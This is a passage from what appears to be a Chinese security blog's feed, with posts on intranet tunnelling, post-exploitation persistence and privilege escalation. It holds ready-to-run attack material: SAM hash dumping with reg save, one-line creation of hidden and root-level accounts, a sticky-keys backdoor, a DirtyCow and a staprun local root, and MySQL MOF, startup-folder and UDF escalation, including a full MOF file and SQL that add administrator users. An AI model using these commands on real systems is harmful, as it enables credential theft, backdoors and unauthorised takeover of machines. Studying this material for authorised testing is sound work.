tunnel</code></p></li><li><p><code>ftp tunnel</code></p><blockquote><p>frp</p></blockquote></li><li><p><code>DNS tunnel</code></p></li><li><code>Ping tunnel</code></li></ul><hr><h4 id="代理软件"><a href="#代理软件" class="headerlink" title="代理软件"></a>代理软件</h4><p>proxifier简单设置</p><ul><li><p>配置文件-&gt;代理服务器<br>地址：<code>127.0.0.1:8888</code><br>协议：<code>SOCKES 5</code></p></li><li><p>代理规则<br>添加应用程序，设置目标机<code>任意</code>，目标端口<code>任意</code>，动作<code>Proxy SOCKS5 127.0.0.1</code></p></li></ul><hr><p>Kali代理<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/proxychains<br>socks5 127.0.0.1 8888<br>proxychains nmap -Pn -p 80 x.x.x.x<br></code></pre></td></tr></table></figure></p><p>proxychains</p><h4 id="htran"><a href="#htran" class="headerlink" title="htran"></a>htran</h4><ol><li><p>外网服务器执行</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 监听两个端口，9001用来接收内网机器，9000连接proxychians等socket5工具的数据</span><br>HTran.exe -p -listen 9001 9000<br></code></pre></td></tr></table></figure></li><li><p>内网机器执行</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">Htran.exe -p -slave 1.1.1.1 9001 127.0.0.1 8009<br></code></pre></td></tr></table></figure></li><li><p>配置本机socket5工具，连接外网服务器上的9000端口<br>推荐<code>Earthworm</code></p></li></ol><hr><h2 id="内网转发多种情况"><a href="#内网转发多种情况" class="headerlink" title="内网转发多种情况"></a>内网转发多种情况</h2><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 本地转发</span><br><span class="hljs-comment"># 使用本地的8888转发172.16.39.141:80的内容</span><br>ssh -CfNg -L 8888:127.0.0.1:80 root@172.16.39.141<br><br><span class="hljs-comment"># 远程转发</span><br><span class="hljs-comment"># 使用172.16.39.141的8888转发本地的80的内容</span><br><span class="hljs-comment"># 只允许172.16.39.141访问172.16.39.141的8888</span><br>ssh -CfNg -R 8888:127.0.0.1:80 root@172.16.39.141<br></code></pre></td></tr></table></figure><hr><h3 id="常见端口转发工具"><a href="#常见端口转发工具" class="headerlink" title="常见端口转发工具"></a>常见端口转发工具</h3><ul><li>portmap</li><li>花生壳<br>等等</li></ul><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="FTP常用命令"><a href="#FTP常用命令" class="headerlink" title="FTP常用命令"></a>FTP常用命令</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">service vsftpd status  <span class="hljs-comment"># 服务状态</span><br>ftp 172.16.12.2  <span class="hljs-comment"># ftp连接</span><br>get shell.txt  <span class="hljs-comment"># 下载</span><br>put shell.txt  <span class="hljs-comment"># 上传</span><br><span class="hljs-built_in">bye</span>  <span class="hljs-comment"># 退出</span><br></code></pre></td></tr></table></figure><h3 id="FTP匿名登录Server-U"><a href="#FTP匿名登录Server-U" class="headerlink" title="FTP匿名登录Server-U"></a>FTP匿名登录Server-U</h3><p>默认账号密码：<br>账号：<code>anonymous</code><br>密码：空或<code>Email</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Intranet </tag>
            
            <tag> Forwading </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>权限维持</title>
      <link href="/2019/02/20/Privilege-persistence/"/>
      <url>/2019/02/20/Privilege-persistence/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>攻击者在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者将如入无人之境</p><h3 id="常见后门技术列表"><a href="#常见后门技术列表" class="headerlink" title="常见后门技术列表"></a>常见后门技术列表</h3><ul><li>隐藏、克隆后门</li><li>shift后门</li><li>启动项、计划任务</li><li>DLL劫持技术</li><li>Powershell后门</li><li>远控软件</li></ul><hr><h2 id="获取系统登陆账号"><a href="#获取系统登陆账号" class="headerlink" title="获取系统登陆账号"></a>获取系统登陆账号</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>系统登陆账号位置：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\System32\config\SAM<br></code></pre></td></tr></table></figure></p><blockquote><p>在Windows系统中，对用户账户的安全管理采用了SAM（Security Account Manager）安全账号管理机制，用户账户以及密码经过Hash加密后，保存在SAM数据库中<br>SAM数据库保存在<code>C:\Windows\System32\config\SAM</code>文件中，当用户登录系统时，首先就要与SAM文件中存放的账户信息进行对比，验证通过方可登陆。系统对SAM文件提供了保护机制，无法将其复制或者删除，也就无法直接读取其中的内容</p></blockquote><hr><h4 id="SAM加密方式"><a href="#SAM加密方式" class="headerlink" title="SAM加密方式"></a>SAM加密方式</h4><ul><li><p>LM加密<br>密码位数 &lt;= 14，不足部分用<code>0</code>补齐，把所有的字符转变为大写，随后分成2组，每组7位，分别加密，然后拼接在一起，就是最终的LM散列。<br>其本质是DES加密</p></li><li><p>NTLM加密<br>先将用户口令转变为unicode编码，在进行标准MD4单向哈希加密</p></li><li><p>两种加密方式区别<br>LM加密安全性远低于NTLM加密，因为NTLM加密允许使用更长的密码、大小写不同，而且无需分割密码为更短、更易被破解的块。所以在一个纯NTLM环境中，应该关闭Lan Manager加密方式</p></li></ul><hr><h4 id="非免杀工具"><a href="#非免杀工具" class="headerlink" title="非免杀工具"></a>非免杀工具</h4><ul><li>wce.exe</li><li>QuarksPwDump.exe</li><li>Pwdump7.exe</li><li>gethash.exe</li><li>mimikatz</li></ul><hr><h4 id="目前免杀版"><a href="#目前免杀版" class="headerlink" title="目前免杀版"></a>目前免杀版</h4><ul><li><p>使用注册表导出Hash</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg save hklm\sam C:\<span class="hljs-built_in">hash</span>\sam.hive<br>reg save hklm\system C:\<span class="hljs-built_in">hash</span>\system.hive<br></code></pre></td></tr></table></figure></li><li><p>导出SAM文件</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 一般用于域控上w至上10w用户时</span><br>shadow copy<br></code></pre></td></tr></table></figure></li><li><p>其他方式</p><blockquote><ul><li>procdump + mimikatz</li><li>lsadump + mimikatz</li><li>powershell + mimikatz</li><li>powershell + getpasshash</li><li>powershell + 其它工具</li></ul></blockquote></li></ul><hr><h4 id="破解方式"><a href="#破解方式" class="headerlink" title="破解方式"></a>破解方式</h4><ul><li><p>在线破解</p><blockquote><p><a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a><br><a href="http://cmd5.com" target="_blank" rel="noopener">http://cmd5.com</a><br><a href="https://www.somd5.com" target="_blank" rel="noopener">https://www.somd5.com</a><br><a href="https://hashkiller.co.uk/" target="_blank" rel="noopener">https://hashkiller.co.uk/</a></p></blockquote></li><li><p>本地破解</p><blockquote><ul><li>暴力破解</li><li>LM加密：cain</li><li>NTLM加密：ophcrack + <a href="http://ophcrack.sourceforge.net/tables.php" target="_blank" rel="noopener"><strong><code>彩虹表</code></strong></a></li></ul></blockquote></li></ul><hr><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li><p>LM只能存储 &lt;= 14个字符 的密码Hash，若 密码 &gt;= 14位，windows就自动使用NTLM对其进行加密了，此时只有对应的NTLM Hash可用，在LM-Password中会以全<code>0</code>显示</p></li><li><p>一般情况下使用工具导出的Hash都有对应的LM和NTLM值，即 密码位数 &lt;= 14，此时LM也会有值，除了LM值全为<code>0</code>之外，在老版本中看到LM为如下开头显示的：<br><code>aad3b435b51404eeaad3b435b51404ee</code><br>即表示密码为空或者位数超过了14位</p></li><li><p>在wind2003之前包括win2003会默认启用LM加密，win2003之后系统禁用了LM加密，使用NTLM加密</p></li><li><p>LM方式的加密会存在一个对应的NTLM Hash值</p></li></ol><hr><h3 id="Linux-Unix"><a href="#Linux-Unix" class="headerlink" title="Linux/Unix"></a>Linux/Unix</h3><h4 id="账号信息存储位置"><a href="#账号信息存储位置" class="headerlink" title="账号信息存储位置"></a>账号信息存储位置</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/passwd<br>/etc/shadow<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root:<span class="hljs-variable">$1</span><span class="hljs-variable">$Bg1H</span>/4mz<span class="hljs-variable">$X89TqH7tpi9dX1B9j5YsF</span>.:14838:0:99999:7:::<br></code></pre></td></tr></table></figure><p>id对应加密方式：<br><code>1</code>：MD5<br><code>5</code>：SHA256<br><code>6</code>：SHA512</p><h4 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h4><p>John The Ripper</p><hr><h2 id="安装后门程序"><a href="#安装后门程序" class="headerlink" title="安装后门程序"></a>安装后门程序</h2><h3 id="Windows-Shift后门"><a href="#Windows-Shift后门" class="headerlink" title="Windows Shift后门"></a>Windows Shift后门</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>利用<code>cmd.exe</code>重命名，并覆盖原来的粘滞键。当再次触发粘滞键时，相当于运行了<code>cmd.exe</code></p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>使用命令，将cmd.exe重命名并替换掉<code>shift</code>（<code>setch.exe</code>）功能，这样当通过远程桌面登陆服务器后，在输入账号密码处，连按5次shift即可弹出cmd命令行，权限为system</p><hr><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>某播放器安装了播放器，而播放器在播放音乐时必须调用windows系统下一个标准动态链接库mp3play.dll，则黑客就自己开发一个恶意的mp3play.dll，然后再找一个MP3歌曲，将这个恶意的DLL和歌曲放在同一个文件下，然后打包压缩发给受害者<br>若受害者用右键将此压缩包中的MP3文件和DLL文件都解压缩到了一个目录中（大部分人会这么做），则受害人点击这个MP3文件时，播放器就会先去寻找mp3play.dll进行加载，<strong>而微软设计的加载dll顺序是先从默认文件本身的目录进行寻找</strong>，则虚假的、恶意的mp3play.dll就先被加载了</p><h4 id="基于IE-DLL劫持"><a href="#基于IE-DLL劫持" class="headerlink" title="基于IE DLL劫持"></a>基于IE DLL劫持</h4><p>原理：<br>在IE目录下构造IE会调用的恶意DLL库，完成提权</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="影子账号"><a href="#影子账号" class="headerlink" title="影子账号"></a>影子账号</h3><p>创建与查看<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user <span class="hljs-built_in">test</span>$ Test123 /add<br>net user <span class="hljs-built_in">test</span>$<br></code></pre></td></tr></table></figure></p><h3 id="一句话添加用户"><a href="#一句话添加用户" class="headerlink" title="一句话添加用户"></a>一句话添加用户</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 一句话添加普通用户</span><br>useradd -p `openssl passwd -1 -salt <span class="hljs-string">'suiyi'</span> mima` zhanghu<br><br><span class="hljs-comment"># 一句话添加用户至root</span><br>useradd -p `openssl passwd -1 -salt <span class="hljs-string">'xxllxx'</span> 123456` -u 0 -g root -G root -s /bin/bash -d /usr/bin/xxllxx xxllxx<br>useradd -p `openssl passwd -1 -salt <span class="hljs-string">'xxllxx'</span> 123456` -u 15 -g root -G root -s /bin/bash -d /usr/bin/xxllxx xxllxx<br><br><span class="hljs-comment"># 一句话修改密码</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">"123456"</span> | passwd --stdin xxllxx<br></code></pre></td></tr></table></figure><hr><h3 id="windows下解决乱码"><a href="#windows下解决乱码" class="headerlink" title="windows下解决乱码"></a>windows下解决乱码</h3><ul><li><p>cmd下乱码：<br><code>chcp 65001</code></p></li><li><p>python输出编码问题</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 指定网页的编码格式</span><br>r.encoding = <span class="hljs-string">'utf-8'</span><br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="windows开启3389端口"><a href="#windows开启3389端口" class="headerlink" title="windows开启3389端口"></a>windows开启3389端口</h3><p>windows低版本<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Windows\System32\wbem\wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting <span class="hljs-built_in">where</span> (__CLASS!=<span class="hljs-string">""</span>) call setallowtsconnections 1<br><br>C:\Windows\System32\wbem\wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting <span class="hljs-built_in">where</span> (TerminalNmae=<span class="hljs-string">'RDP-Tcp'</span>) call setuserauthenticationrequired 1<br><br>reg add <span class="hljs-string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fSingleSessionPerUser /t REG_DWORD /d 0 /f<br><br>net start TermService C:\Windows\System32\wbem\wmic<br></code></pre></td></tr></table></figure></p><hr><h3 id="Linux使用远程桌面"><a href="#Linux使用远程桌面" class="headerlink" title="Linux使用远程桌面"></a>Linux使用远程桌面</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rdesktop 192.168.1.1<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Privilege </tag>
            
            <tag> Persistence </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>权限提升</title>
      <link href="/2019/02/18/Privilege-elevation/"/>
      <url>/2019/02/18/Privilege-elevation/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="提权目的"><a href="#提权目的" class="headerlink" title="提权目的"></a>提权目的</h3><blockquote><p>有时，通过某些方式（例如上传Webshell）获取执行命令的shell，但是会因为权限限制而无法执行某些命令。此时为了“扩大战果”，需要利用提权，使得原本的低权限（如只允许列目录）提升为高权限（如拥有修改文件的能力）</p></blockquote><hr><h2 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h2><h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><h4 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h4><ul><li>本地服务提权漏洞<blockquote><ul><li>iis6、iis5（ms09-020）</li><li>ftp（需要本身的ftp服务权限就很高，ftp，serv-u ftp，g6ftp等）</li><li>smb（MS17-010） 在msf框架下成功率很好，可以正常放回cmdshell</li><li>rpc（ms08-067）</li></ul></blockquote></li><li>系统内核提权漏洞</li></ul><hr><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>收集补丁信息<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo  <span class="hljs-comment"># 可重点查看系统所打补丁</span><br></code></pre></td></tr></table></figure></p><p><a href="https://docs.microsoft.com/zh-cn/security-updates/index" target="_blank" rel="noopener"><strong><code>微软安全通报和公告</code></strong></a></p><h4 id="不能执行命令原因"><a href="#不能执行命令原因" class="headerlink" title="不能执行命令原因"></a>不能执行命令原因</h4><ol><li>权限不够</li><li><code>cmd</code>等（<code>/bin/bash</code>）被禁用</li></ol><p>连接webshell，发现命令不能执行，考虑可能禁用了<code>cmd</code>(或<code>c:\windows\system32</code>无权限)，上传<code>cmd.exe</code>到web根目录，通过cmd.exe执行命令发现可以执行，考虑添加用户，开启<code>3389</code>，进行远程登录<br>添加用户时发现权限不够，查看权限发现是network服务内核权限，不是管理员权限，考虑提权，根据系统版本，使用<code>pr.exe</code>提权<br>执行添加用户，把用户添加到管理员组，开启3389服务<br>提权成功，登录</p><p>使用上传的cmd.exe打开虚拟终端<br>查看端口：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -ano<br></code></pre></td></tr></table></figure></p><p>开启3389端口：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pr.exe <span class="hljs-string">"regedit /s 3389.reg"</span><br><span class="hljs-comment"># 或者：</span><br>pr.exe <span class="hljs-string">"3389.bat"</span><br></code></pre></td></tr></table></figure></p><p>添加用户并加入administrators组<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pr.exe <span class="hljs-string">"user test test /add"</span><br>pr.exe <span class="hljs-string">"net localgroup administrators test /add"</span><br></code></pre></td></tr></table></figure></p><p>或者修改管理员密码<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pr.exe <span class="hljs-string">"net user administrator test"</span><br></code></pre></td></tr></table></figure></p><p>cmd命令<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">net user /?<br>net group /?<br></code></pre></td></tr></table></figure></p><hr><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>判断系统版本<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">uname -a  <span class="hljs-comment"># 查看操作系统内核信息</span><br>cat /proc/version  <span class="hljs-comment"># 查看当前操作系统版本信息</span><br>cat /etc/issur  <span class="hljs-comment"># 查看你版本当前操作系统发行版信息</span><br>cat /etc/redhat-release<br></code></pre></td></tr></table></figure></p><p>判断出内核版本之后，就去找exp（通常是脏牛），然后上传并编译执行<br>上传编译<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc exp.c -o exp  <span class="hljs-comment"># 或者有需要加编译选项：例如脏牛漏洞的</span><br>gcc -pthread dirty.c -o dirty -lcrypt<br></code></pre></td></tr></table></figure></p><p><strong>tip</strong><br>适用于linux系统、安卓系统、大多数嵌入式系统<br><code>DirtyCow</code>（脏牛，条件竞争漏洞）<br>Cow(Copy On Write)</p><p>脏牛漏洞eg:<br>dirtyc0w.c<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> this is a <span class="hljs-built_in">test</span> &gt; foo<br>chmod 404 foo<br>cat foo<br>gcc -pthread dirtyc0w.c -o dirtyc0w<br>./dirtyc0w foo m00000000<br>cat foo<br></code></pre></td></tr></table></figure></p><hr><h5 id="一句话提权"><a href="#一句话提权" class="headerlink" title="一句话提权"></a>一句话提权</h5><p>受影响版本：<code>RedHat Centos  debian  linux&lt;2.6.18-194</code><br>须在bash环境执行<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">"install uprobes /bin/sh"</span> &gt; exploit.conf;MODPROBE_OPTIONS=<span class="hljs-string">"-C exploit.conf"</span> staprun -u whatever<br></code></pre></td></tr></table></figure></p><hr><h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>###<br>原理：</p><ol><li>具有mysql的root权限，且mysql以system权限运行</li><li>具有执行sql语句的权限，webshell或者外连均可</li></ol><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><h4 id="提权原理："><a href="#提权原理：" class="headerlink" title="提权原理："></a>提权原理：</h4><blockquote><p>mof是windows系统的一个文件（在<code>c:/windows/system32/wbem/mof/nullevt.mof</code>）叫做“托管对象格式”，其作用是每隔五秒就回去监控进程创建和死亡。其利用了mysql的root权限以后，然后使用root权限去执行上传的mof。隔了一定时间后，这个mof就会被执行，此mof当中有一段是vbs脚本，大多数时候是cmd的添加管理员用户的命令<br>mof文件通过Mofcomp.exe编译执行</p></blockquote><hr><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> namespace(<span class="hljs-meta-string">"\\\\.\\root\\subscription"</span>)</span><br><br>instance of __EventFilter as $EventFilter &#123;<br>EventNamespace = <span class="hljs-string">"Root\\Cimv2"</span>;<br>Name = <span class="hljs-string">"filtP2"</span>;<br>Query = <span class="hljs-string">"Select * From __InstanceModificationEvent Where TargetInstance Isa \"Win32_LocalTime\" And Target Instance.Second = 5"</span>;<br>QueryLanguage = <span class="hljs-string">"WQL"</span>;<br>&#125;;<br><br>instance of ActiveScriptEventConsumer as $Consumer &#123;<br>Name = <span class="hljs-string">"consPCSV2"</span>;<br>ScriptingEngine = <span class="hljs-string">"JScript"</span>;<br>ScriptText = <span class="hljs-string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"</span>;<br>&#125;;<br><br>instance of __FilterToConsumerBinding &#123;<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>下列方法仅适用于windows系统</p><ol><li>首先找个可写的目录，将MOF文件上传上去</li><li>执行以下sql语句，mof文件内的命令便会执行<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">load_file</span>(<span class="hljs-string">'C:/wmpub/nullevt.mof'</span>) <span class="hljs-keyword">into</span> <span class="hljs-keyword">dumpfile</span> <span class="hljs-string">'c:/windows/system32/webem/mof/nullevt.mof'</span><br></code></pre></td></tr></table></figure></li></ol><hr><h3 id="开机启动项提权"><a href="#开机启动项提权" class="headerlink" title="开机启动项提权"></a>开机启动项提权</h3><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>利用mysql，将后门写入开机自启动项。同时因为开机自启动，在写入之后，需要重启目标服务器（此操作至少是管理员权限）</p><h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><p>自启路径：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># 在此目录下写一个批处理文件(.bat)<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br><br># 或者windows2003及xp路径<br>C：\Documents and Settings\Administrator\[开始]菜单\程序\启动\<br></code></pre></td></tr></table></figure></p><p>写入文件eg：<br>hack.bat<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user <span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span> /add<br>net localgroup Administrators <span class="hljs-built_in">test</span> /add<br></code></pre></td></tr></table></figure></p><hr><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><blockquote><p>UDF(User Defined Function)用户自定义函数，是mysql的一个拓展接口，是拓展其的技术手段</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ul><li>UDF可以理解为MySQL的函数库，可以利用UDF定义创建函数。（其中包括了执行系统命令的函数）</li><li>若要利用UDF，需要上传<code>udf.dll</code>作为UDF的执行库</li><li>mysql中支持UDF扩展，使得可以调用DLL里面的函数来实现一些特殊的功能</li></ul><hr><h4 id="流程概述"><a href="#流程概述" class="headerlink" title="流程概述"></a>流程概述</h4><ul><li>得到插件库路径</li><li>找对应操作系统的udf库文件</li><li>利用udf库文件加载函数并执行命令</li></ul><hr><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>判断mysql版本<br>version &lt; 5.1，UDF导出到系统目录：<br><code>C:/windows/system32/udf.dll</code><br>version &gt;= 5.1，UDF导出到：<br><code>安装路径MySQL/Lib/Plugin/udf.dll</code></p><p>可以在mysql里输入：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 查找mysql安装路径</span><br><span class="hljs-keyword">select</span> @@basedir<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'%plugins%'</span><br></code></pre></td></tr></table></figure></p><p>该目录默认不存在，需要使用Webshell找到mysql安装目录，并在安装目录下创建<code>\lib\plugin</code>文件夹，然后将udf.dll文件导出到该目录</p><hr><h4 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h4><ul><li><p>导出DLL</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> a (cmd LONGBLOB);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> a (cmd) <span class="hljs-keyword">values</span> (<span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">'D:\\Program Files\\MySQL\\MySQL Server 5.0\\Lib\\Plugin\\lib_mysqludf_sys.dll'</span>)));<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">unhex</span>(cmd) <span class="hljs-keyword">from</span> a <span class="hljs-keyword">into</span> <span class="hljs-keyword">DUMPFILE</span> <span class="hljs-string">'c:\\windows\\system32\\udf.dll'</span>;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">soname</span> <span class="hljs-string">'udf.dll'</span>;<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">'ipconfig'</span>);<br></code></pre></td></tr></table></figure></li><li><p>创建用户自定义函数</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> cmdshell <span class="hljs-keyword">returns</span> <span class="hljs-keyword">string</span> <span class="hljs-keyword">soname</span> <span class="hljs-string">'udf.dll'</span>;<br><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">'net user waitalone waitalone.cn /add'</span>);<br><span class="hljs-keyword">select</span> cmdshell(<span class="hljs-string">'net localgroup administrators waitalone /add'</span>);<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> cmdshell;<br>delect from mysql.func where name='cmdshell';<br></code></pre></td></tr></table></figure></li><li><p>利用</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> cmdshell(<span 